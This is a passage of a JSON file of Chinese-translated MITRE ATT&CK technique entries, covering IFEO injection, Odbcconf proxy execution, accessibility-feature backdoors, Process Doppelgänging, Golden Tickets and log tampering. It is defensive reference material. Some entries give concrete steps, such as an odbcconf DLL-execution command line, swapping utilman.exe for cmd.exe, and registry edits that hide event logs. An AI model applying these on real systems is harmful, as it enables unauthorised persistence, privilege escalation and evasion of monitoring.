        "translated_description": "对手可能会通过执行由图像文件执行选项 (IFEO) 调试器触发的恶意内容来建立持久性和/或提升权限。IFEO 使开发人员能够将调试器附加到应用程序。当创建进程时，应用程序的 IFEO 中存在的调试器将被预先添加到应用程序的名称中，有效地在调试器下启动新进程（例如 <code>C:\\dbg\\ntsd.exe -g notepad.exe</code>）。(引用: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEO 可以直接通过注册表或通过 GFlags 工具在全局标志中设置。(引用: Microsoft GFlags Mar 2017) IFEO 在注册表中表示为 <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> 下的 <code>Debugger</code> 值，其中 <code>&lt;executable&gt;</code> 是附加调试器的二进制文件。(引用: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEO 还可以启用在指定程序静默退出（即由其自身或第二个非内核模式进程过早终止）时启动任意监视程序。(引用: Microsoft Silent Process Exit NOV 2017)(引用: Oddvar Moe IFEO APR 2018) 类似于调试器，可以通过 GFlags 和/或直接修改 <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code> 中的 IFEO 和静默进程退出注册表值来启用静默退出监视。(引用: Microsoft Silent Process Exit NOV 2017)(引用: Oddvar Moe IFEO APR 2018)\n\n类似于[辅助功能](https://attack.mitre.org/techniques/T1546/008)，在 Windows Vista 及更高版本以及 Windows Server 2008 及更高版本上，可以修改注册表项，将“cmd.exe”或提供后门访问的其他程序配置为辅助程序（例如 utilman.exe）的“调试器”。修改注册表后，在键盘上或通过[远程桌面协议](https://attack.mitre.org/techniques/T1021/001)连接时按下登录屏幕上的适当键组合将导致以 SYSTEM 权限执行“调试器”程序。(引用: Tilbury 2014)\n\n类似于[进程注入](https://attack.mitre.org/techniques/T1055)，这些值也可能被滥用，通过导致在计算机上的单独进程上下文中加载和运行恶意可执行文件来获得权限提升。(引用: Elastic Process Injection July 2017) 安装 IFEO 机制还可以通过持续触发调用提供持久性。\n\n恶意软件还可能使用 IFEO 通过注册无效调试器来[削弱防御](https://attack.mitre.org/techniques/T1562)，这些调试器会重定向并有效地禁用各种系统和安全应用程序。(引用: FSecure Hupigon)(引用: Symantec Ushedix June 2008)"
    },
    "Odbcconf": {
        "translated_name": "Odbcconf",
        "translated_description": "对手可能会滥用 odbcconf.exe 代理执行恶意有效负载。Odbcconf.exe 是一个 Windows 实用程序，允许您配置开放数据库连接 (ODBC) 驱动程序和数据源名称。(引用: Microsoft odbcconf.exe) Odbcconf.exe 二进制文件可能由 Microsoft 数字签名。\n\n对手可能会滥用 odbcconf.exe 以绕过未考虑其潜在滥用的应用程序控制解决方案。类似于[Regsvr32](https://attack.mitre.org/techniques/T1218/010)，odbcconf.exe 具有一个 <code>REGSVR</code> 标志，可以被滥用来执行 DLL（例如 <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>）。(引用: LOLBAS Odbcconf)(引用: TrendMicro Squiblydoo Aug 2017)(引用: TrendMicro Cobalt Group Nov 2017)"
    },
    "Search Engines": {
        "translated_name": "搜索引擎",
        "translated_description": "对手可能会使用搜索引擎收集有关受害者的信息，以便在目标过程中使用。搜索引擎服务通常会抓取在线网站以索引内容，并可能为用户提供专门的语法以搜索特定关键字或特定类型的内容（即文件类型）。(引用: SecurityTrails Google Hacking)(引用: ExploitDB GoogleHacking)\n\n对手可能会根据他们希望收集的信息制作各种搜索引擎查询。威胁行为者可能会使用搜索引擎收集有关受害者的一般信息，以及使用专门的查询查找敏感信息泄露，例如网络详细信息或凭据。这些来源的信息可能会揭示其他形式的侦察机会（例如[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)），建立操作资源（例如[建立账户](https://attack.mitre.org/techniques/T1585)或[妥协账户](https://attack.mitre.org/techniques/T1586)），和/或初始访问（例如[有效账户](https://attack.mitre.org/techniques/T1078)或[网络钓鱼](https://attack.mitre.org/techniques/T1566)）。"
    },
    "Business Relationships": {
        "translated_name": "业务关系",
        "translated_description": "对手可能会收集有关受害者业务关系的信息，以便在目标过程中使用。有关组织业务关系的信息可能包括各种详细信息，包括具有连接（并可能提升）网络访问权限的第二或第三方组织/域（例如托管服务提供商、承包商等）。此信息还可能揭示受害者硬件和软件资源的供应链和运输路径。\n\n对手可能通过各种方式收集这些信息，例如通过[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接引诱。有关业务关系的信息也可能通过在线或其他可访问的数据集（例如[社交媒体](https://attack.mitre.org/techniques/T1593/001)或[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）暴露给对手。(引用: ThreatPost Broadvoice Leak) 收集这些信息可能会揭示其他形式的侦察机会（例如[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如[建立账户](https://attack.mitre.org/techniques/T1585)或[妥协账户](https://attack.mitre.org/techniques/T1586)），和/或初始访问（例如[供应链妥协](https://attack.mitre.org/techniques/T1195)、[驱动器式妥协](https://attack.mitre.org/techniques/T1189)或[受信任关系](https://attack.mitre.org/techniques/T1199)）。"
    },
    "Temporary Elevated Cloud Access": {
        "translated_name": "临时提升的云访问",
        "translated_description": "对手可能会滥用权限配置，使他们能够获得对云资源的临时提升访问权限。许多云环境允许管理员授予用户或服务帐户请求即时访问角色、模拟其他帐户、将角色传递给资源和服务或以其他方式获得与其自身不同的一组权限的短期访问权限。\n\n即时访问是一种以细粒度、临时方式向云帐户授予额外角色的机制。这允许帐户仅以他们每天需要的权限进行操作，并在必要时请求额外权限。有时即时访问请求被配置为需要手动批准，而其他时候所需的权限会自动授予。(引用: Azure Just in Time Access 2023)\n\n帐户模拟允许用户或服务帐户临时以另一个帐户的权限进行操作。例如，在 GCP 中，具有 `iam.serviceAccountTokenCreator` 角色的用户可以创建临时访问令牌或使用服务帐户的权限签署任意有效负载，而具有域范围委派权限的服务帐户被允许模拟 Google Workspace 帐户。(引用: Google Cloud Service Account Authentication Roles)(引用: Hunters Domain Wide Delegation Google Workspace 2023)(引用: Google Cloud Just in Time Access 2023)(引用: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) 在 Exchange Online 中，`ApplicationImpersonation` 角色允许服务帐户使用与指定用户帐户关联的权限。(引用: Microsoft Impersonation and EWS in Exchange)\n\n许多云环境还包括用户将角色传递给资源的机制，允许他们执行任务并验证其他服务。虽然创建资源的用户不会直接承担他们传递给它的角色，但他们仍然可以利用角色的访问权限——例如，通过配置资源以其被授予的权限执行某些操作。在 AWS 中，具有 `PassRole` 权限的用户可以允许他们创建的服务承担给定角色，而在 GCP 中，具有 `iam.serviceAccountUser` 角色的用户可以将服务帐户附加到资源。(引用: AWS PassRole)(引用: Google Cloud Service Account Authentication Roles)\n\n虽然用户需要特定角色分配才能使用这些功能，但云管理员可能会错误配置权限。这可能导致权限提升路径，使对手能够访问超出最初预期的资源。(引用: Rhino Google Cloud Privilege Escalation)(引用: Rhino Security Labs AWS Privilege Escalation)\n\n**注意：** 这与[额外的云角色](https://attack.mitre.org/techniques/T1098/003)不同，后者涉及为帐户分配永久角色，而不是滥用现有权限结构以获得对资源的临时提升访问权限。然而，妥协了具有足够权限的帐户的对手可能会授予他们控制的另一个帐户[额外的云角色](https://attack.mitre.org/techniques/T1098/003)，这将允许他们也滥用这些功能。这可能比直接使用高度特权帐户更隐蔽，特别是当日志未明确说明何时进行角色模拟时。(引用: CrowdStrike StellarParticle January 2022)"
    },
    "Video Capture": {
        "translated_name": "视频捕获",
        "translated_description": "对手可以利用计算机的外围设备（例如集成摄像头或网络摄像头）或应用程序（例如视频通话服务）捕获视频录制以收集信息。图像也可以从设备或应用程序中捕获，可能以指定的间隔代替视频文件。\n\n恶意软件或脚本可能会通过操作系统或应用程序提供的可用 API 与设备交互以捕获视频或图像。视频或图像文件可能会写入磁盘并稍后外传。此技术不同于[屏幕捕获](https://attack.mitre.org/techniques/T1113)，因为它使用特定设备或应用程序进行视频录制，而不是捕获受害者的屏幕。\n\n在 macOS 中，有一些不同的恶意软件样本可以记录用户的网络摄像头，例如 FruitFly 和 Proton。(引用: objective-see 2017 review)"
    },
    "Process Doppelgänging": {
        "translated_name": "进程双重映射",
        "translated_description": "对手可能会通过进程双重映射将恶意代码注入进程，以规避基于进程的防御并可能提升权限。进程双重映射是一种在单独的活动进程的地址空间中执行任意代码的方法。\n\nWindows Transactional NTFS (TxF) 在 Vista 中引入，作为执行安全文件操作的方法。(引用: Microsoft TxF) 为确保数据完整性，TxF 仅允许一个事务句柄在给定时间写入文件。在写入句柄事务终止之前，所有其他句柄都与写入者隔离，并且只能读取在打开句柄时存在的已提交版本的文件。(引用: Microsoft Basic TxF Concepts) 为避免损坏，如果系统或应用程序在写入事务期间失败，TxF 会自动回滚。(引用: Microsoft Where to use TxF)\n\n尽管已弃用，但截至 Windows 10，TxF 应用程序编程接口 (API) 仍然启用。(引用: BlackHat Process Doppelgänging Dec 2017)\n\n对手可能会滥用 TxF 执行无文件的[进程注入](https://attack.mitre.org/techniques/T1055)变体。类似于[进程空洞](https://attack.mitre.org/techniques/T1055/012)，进程双重映射涉及替换合法进程的内存，从而使恶意代码的隐蔽执行可能规避防御和检测。进程双重映射使用 TxF 还避免了使用高度监控的 API 函数，如<code>NtUnmapViewOfSection</code>、<code>VirtualProtectEx</code>和<code>SetThreadContext</code>。(引用: BlackHat Process Doppelgänging Dec 2017)\n\n进程双重映射分为 4 个步骤(引用: BlackHat Process Doppelgänging Dec 2017)：\n\n* 事务 – 使用合法可执行文件创建 TxF 事务，然后用恶意代码覆盖文件。这些更改将被隔离，并且仅在事务上下文中可见。\n* 加载 – 创建共享内存段并加载恶意可执行文件。\n* 回滚 – 撤销对原始可执行文件的更改，有效地从文件系统中删除恶意代码。\n* 动画 – 从污染的内存段创建进程并启动执行。\n\n由于注入的进程是从注入进程生成的（因此继承了注入进程的安全上下文），这种行为可能不会导致权限提升。然而，通过进程双重映射执行可能会规避安全产品的检测，因为执行被掩盖在合法进程下。"
    },
    "System Network Configuration Discovery": {
        "translated_name": "系统网络配置发现",
        "translated_description": "对手可能会查找有关他们访问的系统或通过远程系统信息发现的网络配置和设置的详细信息，例如 IP 和/或 MAC 地址。存在几种操作系统管理实用程序可用于收集此信息。例如包括[Arp](https://attack.mitre.org/software/S0099)、[ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101)、[nbtstat](https://attack.mitre.org/software/S0102)和[route](https://attack.mitre.org/software/S0103)。\n\n对手还可能利用网络设备上的[网络设备 CLI](https://attack.mitre.org/techniques/T1059/008)来收集有关配置和设置的信息，例如配置接口的 IP 地址和静态/动态路由（例如<code>show ip route</code>、<code>show ip interface</code>）。(引用: US-CERT-TA18-106A)(引用: Mandiant APT41 Global Intrusion)\n\n对手可能会使用[系统网络配置发现](https://attack.mitre.org/techniques/T1016)中的信息在自动化发现期间塑造后续行为，包括确定目标网络中的某些访问权限以及接下来要执行的操作。"
    },
    "Delete Cloud Instance": {
        "translated_name": "删除云实例",
        "translated_description": "对手可能会在执行恶意活动后删除云实例，以试图规避检测并删除其存在的证据。删除实例或虚拟机可以删除有价值的取证工件和其他可疑行为的证据，如果实例不可恢复。\n\n对手还可能[创建云实例](https://attack.mitre.org/techniques/T1578/002)并在实现其目标后终止实例。(引用: Mandiant M-Trends 2020)"
    },
    "Code Repositories": {
        "translated_name": "代码库",
        "translated_description": "对手可能会利用代码库收集有价值的信息。代码库是存储源代码并自动化软件构建的工具/服务。它们可能托管在内部或第三方网站上，如 Github、GitLab、SourceForge 和 BitBucket。用户通常通过 Web 应用程序或命令行实用程序（如 git）与代码库交互。\n\n一旦对手获得对受害者网络或私有代码库的访问权限，他们可能会收集敏感信息，例如专有源代码或包含在软件源代码中的[不安全凭据](https://attack.mitre.org/techniques/T1552)。访问软件源代码可能允许对手开发[漏洞利用](https://attack.mitre.org/techniques/T1587/004)，而凭据可能提供使用[有效账户](https://attack.mitre.org/techniques/T1078)访问其他资源的权限。(引用: Wired Uber Breach)(引用: Krebs Adobe)\n\n**注意：** 这与[代码库](https://attack.mitre.org/techniques/T1593/003)不同，后者侧重于通过公共代码库进行[侦察](https://attack.mitre.org/tactics/TA0043)。"
    },
    "Executable Installer File Permissions Weakness": {
        "translated_name": "可执行安装文件权限弱点",
        "translated_description": "对手可能通过劫持安装程序使用的二进制文件来执行他们自己的恶意负载。这些进程可能会自动执行特定的二进制文件，作为其功能的一部分或执行其他操作。如果包含目标二进制文件的文件系统目录或二进制文件本身的权限设置不正确，则可以使用用户级权限覆盖目标二进制文件，并由原始进程执行。如果原始进程和线程在更高权限级别下运行，则替换的二进制文件也将在更高权限级别下执行，这可能包括 SYSTEM。\n\n此技术的另一种变体可以通过利用可执行自解压安装程序中常见的弱点来执行。在安装过程中，安装程序通常使用<code>%TEMP%</code>目录中的子目录来解压缩 DLL、EXE 或其他负载等二进制文件。当安装程序创建子目录和文件时，它们通常不会设置适当的权限来限制写访问，这允许在子目录中执行不受信任的代码或覆盖安装过程中使用的二进制文件。这种行为与[DLL 搜索顺序劫持](https://attack.mitre.org/techniques/T1574/001)有关，并可能利用其优势。\n\n对手可能会使用此技术替换合法的二进制文件，以更高权限级别执行代码。一些安装程序还可能需要提升权限，这将在执行对手控制的代码时导致权限提升。这种行为与[绕过用户帐户控制](https://attack.mitre.org/techniques/T1548/002)有关。已经向软件供应商报告了几个现有常见安装程序中此弱点的示例。(引用: mozilla_sec_adv_2012)(引用: Executable Installers are Vulnerable) 如果执行进程设置为在特定时间或某个事件（例如系统启动）期间运行，则此技术还可用于持久性。"
    },
    "Accessibility Features": {
        "translated_name": "辅助功能",
        "translated_description": "对手可能会通过执行由辅助功能触发的恶意内容来建立持久性和/或提升权限。Windows 包含辅助功能，可以在用户登录之前通过按键组合启动（例如：当用户在 Windows 登录屏幕上时）。对手可以修改这些程序的启动方式，以在不登录系统的情况下获得命令提示符或后门。\n\n两个常见的辅助程序是<code>C:\\Windows\\System32\\sethc.exe</code>，按下五次 Shift 键时启动，以及<code>C:\\Windows\\System32\\utilman.exe</code>，按下 Windows + U 键组合时启动。sethc.exe 程序通常称为“粘滞键”，对手已使用它通过远程桌面登录屏幕进行未经身份验证的访问。(引用: FireEye Hikit Rootkit)\n\n根据 Windows 的版本，对手可能会以不同方式利用这些功能。对手常用的方法包括替换辅助功能二进制文件或注册表中指向这些二进制文件的指针/引用。在较新的 Windows 版本中，替换的二进制文件需要为 x64 系统进行数字签名，二进制文件必须位于<code>%systemdir%\\</code>，并且必须受 Windows 文件或资源保护 (WFP/WRP) 保护。(引用: DEFCON2016 Sticky Keys) 可能发现[图像文件执行选项注入](https://attack.mitre.org/techniques/T1546/012)调试器方法作为一种潜在的解决方法，因为它不需要替换相应的辅助功能二进制文件。\n\n对于 Windows XP 及更高版本以及 Windows Server 2003/R2 及更高版本上的简单二进制替换，例如，可以将程序（例如<code>C:\\Windows\\System32\\utilman.exe</code>）替换为“cmd.exe”（或提供后门访问的其他程序）。随后，在登录屏幕上按下适当的键组合时，无论是坐在键盘前还是通过[远程桌面协议](https://attack.mitre.org/techniques/T1021/001)连接，都将导致以 SYSTEM 权限执行替换的文件。(引用: Tilbury 2014)\n\n还存在其他辅助功能，可能以类似方式被利用：(引用: DEFCON2016 Sticky Keys)(引用: Narrator Accessibility Abuse)\n\n* 屏幕键盘：<code>C:\\Windows\\System32\\osk.exe</code>\n* 放大镜：<code>C:\\Windows\\System32\\Magnify.exe</code>\n* 讲述人：<code>C:\\Windows\\System32\\Narrator.exe</code>\n* 显示切换器：<code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* 应用切换器：<code>C:\\Windows\\System32\\AtBroker.exe</code>"
    },
    "Bandwidth Hijacking": {
        "translated_name": "带宽劫持",
        "translated_description": "对手可能会利用被劫持系统的网络带宽资源来完成资源密集型任务，这可能会影响系统和/或托管服务的可用性。\n\n对手还可能使用利用系统网络带宽的恶意软件作为僵尸网络的一部分，以促进[网络拒绝服务](https://attack.mitre.org/techniques/T1498)攻击和/或播种恶意种子。(引用: GoBotKR) 另外，他们可能通过将受害者的网络带宽和IP地址出售给代理服务来进行代理劫持。(引用: Sysdig Proxyjacking) 最后，他们可能进行互联网范围的扫描，以识别更多的目标进行攻击。(引用: Unit 42 Leaked Environment Variables 2024)\n\n除了可能产生的财务成本或可用性中断外，如果受害者的带宽被用于非法活动，这种技术还可能造成声誉损害。(引用: Sysdig Proxyjacking)"
    },
    "Account Discovery": {
        "translated_name": "账户发现",
        "translated_description": "对手可能会尝试获取系统或受损环境中的有效账户、用户名或电子邮件地址列表。这些信息可以帮助对手确定哪些账户存在，从而有助于后续行为，例如暴力破解、鱼叉式网络钓鱼攻击或账户接管（例如，[有效账户](https://attack.mitre.org/techniques/T1078)）。\n\n对手可能会使用多种方法枚举账户，包括滥用现有工具、内置命令以及可能泄露账户名称和角色或权限的配置错误。\n\n例如，云环境通常提供易于访问的接口来获取用户列表。(引用: AWS List Users)(引用: Google Cloud - IAM Servie Accounts List API) 在主机上，对手可以使用默认的[PowerShell](https://attack.mitre.org/techniques/T1059/001)和其他命令行功能来识别账户。有关电子邮件地址和账户的信息也可以通过搜索受感染系统的文件提取。"
    },
    "Proxy": {
        "translated_name": "代理",
        "translated_description": "对手可能会使用连接代理来引导系统之间的网络流量或作为与命令和控制服务器通信的中介，以避免直接连接到他们的基础设施。许多工具可以通过代理或端口重定向实现流量重定向，包括[HTRAN](https://attack.mitre.org/software/S0040)、ZXProxy和ZXPortMap。(引用: Trend Micro APT Attack Tools) 对手使用这些类型的代理来管理命令和控制通信，减少同时出站网络连接的数量，在连接丢失的情况下提供弹性，或通过受害者之间现有的受信任通信路径进行通信以避免怀疑。对手可能会将多个代理链在一起，以进一步掩盖恶意流量的来源。\n\n对手还可以利用内容分发网络（CDN）中的路由方案来代理命令和控制流量。"
    },
    "Command and Scripting Interpreter": {
        "translated_name": "命令和脚本解释器",
        "translated_description": "对手可能会滥用命令和脚本解释器来执行命令、脚本或二进制文件。这些接口和语言提供了与计算机系统交互的方法，是许多不同平台的常见功能。大多数系统都带有一些内置的命令行界面和脚本功能，例如，macOS和Linux发行版包括某种形式的[Unix Shell](https://attack.mitre.org/techniques/T1059/004)，而Windows安装包括[Windows命令行](https://attack.mitre.org/techniques/T1059/003)和[PowerShell](https://attack.mitre.org/techniques/T1059/001)。\n\n还有一些跨平台的解释器，例如[Python](https://attack.mitre.org/techniques/T1059/006)，以及那些通常与客户端应用程序相关的解释器，例如[JavaScript](https://attack.mitre.org/techniques/T1059/007)和[Visual Basic](https://attack.mitre.org/techniques/T1059/005)。\n\n对手可能会以各种方式滥用这些技术来执行任意命令。命令和脚本可以嵌入到传递给受害者的初始访问有效载荷中，作为诱饵文档或从现有C2下载的二级有效载荷。对手还可能通过交互式终端/外壳执行命令，以及利用各种[远程服务](https://attack.mitre.org/techniques/T1021)来实现远程执行。(引用: Powershell Remote Commands)(引用: Cisco IOS Software Integrity Assurance - Command History)(引用: Remote Shell Execution in Python)"
    },
    "Indicator Blocking": {
        "translated_name": "指标阻断",
        "translated_description": "对手可能会尝试阻止传感器通常捕获的指标或事件被收集和分析。这可能包括恶意重定向(引用: Microsoft Lamin Sept 2017)或甚至禁用主机传感器，例如通过篡改控制事件遥测收集和流动的设置来禁用Windows事件跟踪(ETW)(引用: Microsoft About Event Tracing 2018)。(引用: Medium Event Tracing Tampering 2018) 这些设置可能存储在系统中的配置文件和/或注册表中，也可以通过管理实用程序如[PowerShell](https://attack.mitre.org/techniques/T1059/001)或[Windows管理工具](https://attack.mitre.org/techniques/T1047)访问。\n\n例如，对手可能会修改<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code>中的`File`值，以将其恶意行为隐藏在新的或不同的.evtx日志文件中。此操作不需要系统重启，并立即生效。(引用: disable_win_evt_logging)\n\nETW中断可以通过多种方式实现，但最直接的方法是使用[PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet定义条件，或直接与注册表交互进行更改。\n\n在网络指标报告的情况下，对手可能会阻止与报告相关的流量，以防止集中分析。这可以通过多种方式实现，例如停止负责转发遥测的本地进程和/或创建主机防火墙规则以阻止特定主机的流量，这些主机负责聚合事件，例如安全信息和事件管理(SIEM)产品。\n\n在Linux环境中，对手可能会禁用或重新配置日志处理工具如syslog或nxlog，以抑制检测和监控能力，以促进后续行为。(引用: LemonDuck)"
    },
    "Employee Names": {
        "translated_name": "员工姓名",
        "translated_description": "对手可能会收集可用于目标过程的员工姓名。员工姓名可以用来推导电子邮件地址，并帮助指导其他侦察工作和/或制作更可信的诱饵。\n\n对手可能很容易收集员工姓名，因为它们可能通过在线或其他可访问的数据集（例如[社交媒体](https://attack.mitre.org/techniques/T1593/001)或[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）公开并暴露。(引用: OPM Leak) 收集这些信息可能会揭示其他形式的侦察机会（例如[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)），建立操作资源（例如[妥协账户](https://attack.mitre.org/techniques/T1586)），和/或初始访问（例如[网络钓鱼](https://attack.mitre.org/techniques/T1566)或[有效账户](https://attack.mitre.org/techniques/T1078)）。"
    },
    "Domain Trust Discovery": {
        "translated_name": "域信任发现",
        "translated_description": "对手可能会尝试收集有关域信任关系的信息，以识别Windows多域/森林环境中的横向移动机会。域信任提供了一种机制，使一个域可以基于另一个域的身份验证过程允许访问资源。(引用: Microsoft Trusts) 域信任允许受信域的用户访问信任域中的资源。发现的信息可能有助于对手进行[SID历史注入](https://attack.mitre.org/techniques/T1134/005)、[传递票证](https://attack.mitre.org/techniques/T1550/003)和[Kerberoasting](https://attack.mitre.org/techniques/T1558/003)。(引用: AdSecurity Forging Trust Tickets)(引用: Harmj0y Domain Trusts) 可以使用`DSEnumerateDomainTrusts()` Win32 API调用、.NET方法和LDAP枚举域信任。(引用: Harmj0y Domain Trusts) 已知对手使用Windows实用程序[Nltest](https://attack.mitre.org/software/S0359)枚举域信任。(引用: Microsoft Operation Wilysupply)"
    },
    "Golden Ticket": {
        "translated_name": "黄金票证",
        "translated_description": "对手如果拥有KRBTGT账户密码哈希，可以伪造Kerberos票证授予票证(TGT)，也称为黄金票证。(引用: AdSecurity Kerberos GT Aug 2015) 黄金票证使对手能够为Active Directory中的任何账户生成身份验证材料。(引用: CERT-EU Golden Ticket Protection)\n\n使用黄金票证，对手可以请求票证授予服务(TGS)票证，从而访问特定资源。黄金票证要求对手与密钥分发中心(KDC)交互以获取TGS。(引用: ADSecurity Detecting Forged Tickets)\n\nKDC服务在属于Active Directory域的所有域控制器上运行。KRBTGT是Kerberos密钥分发中心(KDC)服务账户，负责加密和签署所有Kerberos票证。(引用: ADSecurity Kerberos and KRBTGT) 可以通过[操作系统凭据转储](https://attack.mitre.org/techniques/T1003)和对域控制器的特权访问获取KRBTGT密码哈希。"
    },
    "Automated Exfiltration": {
        "translated_name": "自动化数据外传",
        "translated_description": "对手可能会通过在收集期间收集的数据使用自动化处理来外传数据，例如敏感文档。(引用: ESET Gamaredon June 2020) \n\n当使用自动化外传时，其他外传技术也可能适用，以将信息传出网络，例如[通过C2通道外传](https://attack.mitre.org/techniques/T1041)和[通过替代协议外传](https://attack.mitre.org/techniques/T1048)。"
    },
    "Client Configurations": {
        "translated_name": "客户端配置",
        "translated_description": "对手可能会收集有关受害者客户端配置的信息，以便在目标过程中使用。有关客户端配置的信息可能包括各种详细信息和设置，包括操作系统/版本、虚拟化、架构（例如：32位或64位）、语言和/或时区。\n\n对手可能通过各种方式收集这些信息，例如通过[主动扫描](https://attack.mitre.org/techniques/T1595)（例如：监听端口、服务器横幅、用户代理字符串）或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接收集。对手还可能妥协网站，然后包含旨在从访问者那里收集主机信息的恶意内容。(引用: ATT ScanBox) 有关客户端配置信息也可能通过在线或其他可访问的数据集（例如：职位发布、网络地图、评估报告、简历或采购发票）暴露给对手。收集这些信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)），建立操作资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587)或[获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如：[供应链妥协](https://attack.mitre.org/techniques/T1195)或[外部远程服务](https://attack.mitre.org/techniques/T1133)）。"
    },
    "Disable or Modify Cloud Firewall": {
        "translated_name": "禁用或修改云防火墙",
        "translated_description": "对手可能会禁用或修改云环境中的防火墙，以绕过限制访问云资源的控制。云防火墙与[禁用或修改系统防火墙](https://attack.mitre.org/techniques/T1562/004)中描述的系统防火墙不同。\n\n云环境通常使用限制性安全组和防火墙规则，仅允许来自受信任IP地址的网络活动通过预期的端口和协议。具有适当权限的对手可能会引入新的防火墙规则或策略，以允许进入受害者云环境和/或从云控制平面移动到数据平面。例如，对手可能会使用脚本或实用程序，在现有安全组中创建新的入口规则（或完全创建新的安全组），以允许任何TCP/IP连接到云托管实例。(引用: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) 他们还可能移除网络限制，以支持与恶意活动（如加密货币挖掘）相关的流量。(引用: Expel IO Evil in AWS)(引用: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\n修改或禁用云防火墙可能使对手的C2通信、横向移动和/或数据外传得以进行，否则这些操作将不被允许。它还可能用于开放资源以进行[暴力破解](https://attack.mitre.org/techniques/T1110)或[端点拒绝服务](https://attack.mitre.org/techniques/T1499)。"
    },
    "Right-to-Left Override": {
        "translated_name": "右到左覆盖",
        "translated_description": "对手可能会滥用右到左覆盖 (RTLO 或 RLO) 字符 (U+202E) 来伪装字符串和/或文件名，使其看起来无害。RTLO 是一个不可打印的 Unicode 字符，会导致其后的文本以相反的顺序显示。例如，一个名为 <code>March 25 \\u202Excod.scr</code> 的 Windows 屏幕保护程序可执行文件将显示为 <code>March 25 rcs.docx</code>。一个名为 <code>photo_high_re\\u202Egnp.js</code> 的 JavaScript 文件将显示为 <code>photo_high_resj.png</code>。(引用: Infosecinstitute RTLO Technique)\n\n对手可能会滥用 RTLO 字符作为一种手段，欺骗用户执行他们认为是无害文件类型的文件。这种技术的常见用途是与[鱼叉式网络钓鱼附件](https://attack.mitre.org/techniques/T1566/001)/[恶意文件](https://attack.mitre.org/techniques/T1204/002)一起使用，因为它可以欺骗最终用户和防御者，如果他们不知道他们的工具如何显示和呈现 RTLO 字符。RTLO 字符的使用已在许多有针对性的入侵尝试和犯罪活动中被发现。(引用: Trend Micro PLEAD RTLO)(引用: Kaspersky RTLO Cyber Crime) RTLO 也可以在 Windows 注册表中使用，其中 regedit.exe 显示反转的字符，但命令行工具 reg.exe 默认不显示。"
    },
    "Component Firmware": {
        "translated_name": "组件固件",
        "translated_description": "对手可能会修改组件固件以在系统上持久存在。一些对手可能会采用复杂的方法来破坏计算机组件并安装恶意固件，该固件将在操作系统和主系统固件或 BIOS 之外执行对手代码。这种技术可能类似于[系统固件](https://attack.mitre.org/techniques/T1542/001)，但在其他系统组件/设备上进行，这些组件/设备可能没有相同的能力或完整性检查级别。\n\n恶意组件固件可以在尽管潜在的典型故障无法维持访问和硬盘重新映像的情况下提供对系统的持久访问级别，以及一种绕过主机软件防御和完整性检查的方法。"
    },
    "Indicator Removal": {
        "translated_name": "指标移除",
        "translated_description": "对手可能会删除或修改系统内生成的工件，以消除其存在的证据或阻碍防御。各种工件可能由对手创建或可以归因于对手的行为。通常，这些工件用作与监控事件相关的防御指标，例如从下载文件、用户操作生成的日志和防御者分析的其他数据。工件的位置、格式和类型（例如命令或登录历史记录）通常特定于每个平台。\n\n删除这些指标可能会干扰事件收集、报告或用于检测入侵活动的其他过程。这可能会通过导致显著事件未报告来损害安全解决方案的完整性。由于缺乏足够的数据来确定发生了什么，这种活动还可能阻碍取证分析和事件响应。"
    },
    "Exfiltration Over Symmetric Encrypted Non-C2 Protocol": {
        "translated_name": "通过对称加密的非C2协议外传",
        "translated_description": "对手可能会通过对称加密的网络协议（而不是现有的命令和控制通道）外传数据。数据也可能被发送到与主命令和控制服务器不同的网络位置。\n\n对称加密算法是指在通道的每一端使用共享或相同密钥/秘密的算法。这需要交换或预先安排/持有用于加密和解密数据的值。\n\n使用非对称加密的网络协议通常在密钥交换后使用对称加密，但对手可能会选择手动共享密钥并实现对称加密算法（例如：RC4、AES），而不是使用协议中内置的机制。这可能导致多层加密（在本质上已加密的协议中，例如 HTTPS）或在通常不加密的协议中（例如 HTTP 或 FTP）进行加密。"
    },
    "Office Template Macros": {
        "translated_name": "Office模板宏",
